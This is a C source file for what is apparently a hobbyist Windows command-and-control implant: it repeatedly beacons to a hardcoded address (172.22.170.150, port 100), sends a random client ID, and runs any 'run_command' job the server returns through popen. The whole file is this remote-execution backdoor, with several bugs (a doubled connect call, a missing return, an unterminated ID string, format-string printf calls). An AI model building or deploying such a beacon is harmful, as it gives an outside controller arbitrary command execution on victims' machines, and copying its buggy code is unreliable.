#include <stdio.h>
#include <stdlib.h>

//linux
//#include <sys/socket.h>
//#include <arpa/inet.h>

//windows
#include <winsock2.h>
#include <ws2tcpip.h> 

#include <unistd.h>
#include <string.h>
#include <time.h>

//declaring functions
char* run_command(char* command);
int send_message(int sock, char *response);
char * phone_home();
char * client_id_generate();
char * decision_tree(int sock, int valread, char * buffer);

//structs for the win... makes life easy :)
struct connection {
    int first_connection;
    char * client_id;
    int heartbeat;
    int port;
    char * address;
};

struct connection server_connection;

typedef struct {
    char * job;
    char * command;
} job;
//job current_job = {"name","command"};
//have to initialize down here so the compiler knows what 'job' is
job string_splitter(char * string_to_split);

int main() {
    char * ph_value;

    //int first_connection = 0;
    server_connection.client_id = client_id_generate();
    server_connection.heartbeat = 15;
    server_connection.port = 100;
    server_connection.address = "172.22.170.150";
    //client id

    //char * client_id = client_id_generate();

    while ( 1 == 1) {
        // phoning home
        printf("\nPhoning home\n");

        //receiveing commands from server & doing jobs
        
        ph_value = phone_home(server_connection.client_id);

        //int first_connection = 1;

        //printf("ph_value = %s", ph_value);

        // if server says wait, return continue & wait for X time
        if ( strcmp(ph_value, "continue" ) == 0 ) {
            printf("SLEEPING IN MAIN\n");
            sleep(server_connection.heartbeat);
            //for some reason it sleeps first, then prints?
        }

        // catchall for if nothing matches, it assumes this is an error & exits
        // Err statemnts/more specifics come from return functions in phone_home
        else {
            printf("ERR: %s\n", ph_value);
            return -1;
        }
        
    }
    
    return 1;

}

#pragma comment(lib, "ws2_32.lib") // Link with ws2_32.lib

char* phone_home(char* client_id) {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serv_addr;
    char* hello = "Hello from client";
    char buffer[1024] = {0};
    int valread;

    printf("Process ID: %d\n", GetCurrentProcessId());

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed. Error Code : %d", WSAGetLastError());
        return "continue";
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket creation error : %d", WSAGetLastError());
        WSACleanup();
        return "continue";
    }

    // Set server address and port
    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(server_connection.port);
    serv_addr.sin_addr.s_addr = inet_addr(server_connection.address);

    // Convert IPv4 and IPv6 addresses from text to binary form
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) != 0) {
        printf("Connection error\n");
        closesocket(sock);
        WSACleanup();
        return "continue";
    }

    // Heartbeat: on failed connection, 'wait' for X time & try to reconnect again. 
    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
        printf("Connection error : %d", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return "continue";
    }

    else {
        decision_tree(sock, valread, buffer);
    }
    
    
    // if connect does not error out/not connect, run decision_tree, otherwise wait (return continue)

}



/* Del up to here for windows, then copy paste over*/

//need to get proper variables passed here, atm the loop workds, but this is not set up yet
char * decision_tree(int sock, int valread, char * buffer) {
    
    //printf("server first connection: %i\n", server_connection.first_connection);

    send_message(sock, server_connection.client_id);
    printf("waiting on server response=======\n");

    valread = read(sock, buffer, 1024);
    printf("RECEIVED BACK: %s\n", buffer);

    int len = strlen(buffer); // get the length of the string
    char* new_buffer = malloc(len + 1); // allocate memory for new buffer that can hold null character
    strcpy(new_buffer, buffer); // copy original string to new buffer
    new_buffer[len] = '\0';


    job return_job = string_splitter(new_buffer);

    printf("\n%s, %s\n", return_job.job, return_job.command);

    //printf("%s\n", new_buffer);

    
    ///// Decision tree

    if ( strcmp(return_job.job, "run_command" ) == 0 ) {
        printf("Run command Function \n");
        //creating space on the heap for the results
        char * command_results = malloc(1024);

        //copying results to said memory location
        strcpy(command_results, run_command(return_job.command));

        //printing results
        printf("%s\n", command_results);

        //freeing memory
        free(command_results);
        return "continue";

    }

    else if ( strcmp(return_job.job, "wait" )==0) {
        printf("Received wait...");
        return "continue";
    }


    else {
        printf("DEBUG: WAITING AS NO COMMANDS WERE RECIEVED\n");
        //close(sock);
        return "continue";
    }


    // closing sock 
    //close(sock);

    //cleanup
    free(return_job.job);
    free(return_job.command);
    free(new_buffer);


    return "continue";
}


//this takes the socket file, and the response to send back to the server. 
int send_message(int sock, char *response) {
    printf("Sending '%s'\n", response);
    //char * cat_response = "test\\|/test";

    //creating space in memory, as char * cat_response is an uninitizalized pointer.
    //basically, it needs a spot to store its output
    char * cat_response = malloc(strlen(server_connection.client_id) + strlen(response) + 3);

    // this is hanging due to no timeout I think. No idea why the program is ending though
    //wiat... why is it trying to send a message if its not connected??
    /*
    if (send(sock, response, strlen(response),0 ) < 0) {
        perror("sending error");
        return -1;
    }
    
    else {
        //send(sock, response, strlen(response),0);
        printf("DEBUG: Message sent successfully==========\n\n");
        //return 0;
    }*/

    //combining the clinet ID, and the message to send back

    sprintf(cat_response, "%s\\|/%s", server_connection.client_id, response);

    printf(cat_response);

    send(sock, cat_response, strlen(cat_response),0);
    free(cat_response);
    //send(sock, "ID\\|/response", strlen("ID\\|/response"),0);
    printf("DEBUG: Message sent successfully==========\n\n");
    return 0;

}

//This is pretty sweet, integrating a struct & the function

// basically creating our own data type, in this case the 'job' data type
//makes it easier to do returns and such as well (see job string_splitter)


job string_splitter(char * string_to_split) {
    printf(string_to_split);

    job return_job = { NULL, NULL };

    //giving these memory as they will be used outside of this function
    return_job.job = malloc(1024);
    return_job.command = malloc(1024);

    if (string_to_split == NULL) {
        printf("Error: string_to_split is NULL.\n");
        return return_job;
    }
    
    char* splitter_queue;
    char* first_part = NULL;
    char* second_part = NULL;

    splitter_queue = strtok(string_to_split, "\\|/"); //: \|/ is delim

    if (splitter_queue != NULL) {
        first_part = splitter_queue;
        splitter_queue = strtok(NULL, "\\|/");
        if (splitter_queue != NULL) {
            second_part = splitter_queue;
        }

        /* Catch incase the server doesn't send anything in the second slot*/
        else {
            second_part = "empty_from_server";
        }

    } else {
        printf("Error: delimiter not found in string.\n");
        return return_job;
    }

    // copying first & second part to this struct
    strcpy(return_job.job, first_part);
    strcpy(return_job.command, second_part);

    return return_job;
}


char* run_command(char* raw_command) {
    printf("(standin) Runnning command %s\n",raw_command);
    //return "something";

    FILE *fp;
    char path[1035];

    //memory for results_return
    char * results_return = malloc(1024);

    /* Open the command for reading. */
    fp = popen(raw_command, "r");
    if (fp == NULL) {
        printf("Failed to run command\n" );
        exit(1);
    }

    /* Read the output a line at a time - output it. */
    while (fgets(path, sizeof(path), fp) != NULL) {
        printf("%s", path);
    }

    /* close */
    pclose(fp);

    strcpy(results_return, path);
    return results_return;

}

char * client_id_generate() {
    // seed the random number generator with the current time
    srand(time(NULL));


    // adding a spot in memory for this variable, as it will vanish otherwise (on return) if not allocated
    char* random_string = malloc(sizeof(char) * 6);

    for (int i = 0; i < 5; i++) {
        int random_number = rand() % 26;
        random_string[i] = 'A' + random_number;
    }
    //random_string[5] = '\0';
    
    // print the random string
    printf("Random string: %i\n", random_string[6]);
    
    return random_string;

}